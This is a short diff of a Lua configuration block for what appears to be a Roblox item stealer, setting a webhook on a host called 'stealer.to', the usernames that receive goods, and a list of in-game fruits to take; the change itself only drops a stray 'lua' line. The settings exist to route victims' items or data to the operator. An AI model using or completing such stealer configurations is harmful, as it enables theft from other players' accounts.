@@ -1,4 +1,4 @@
-lua
+
 Webhook = "https://stealer.to/post?uniqueid=db584f13" -- << Your Webhook
 Usernames = {"Envixity_402", "Envixity_402"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas",} -- << Fruits you want
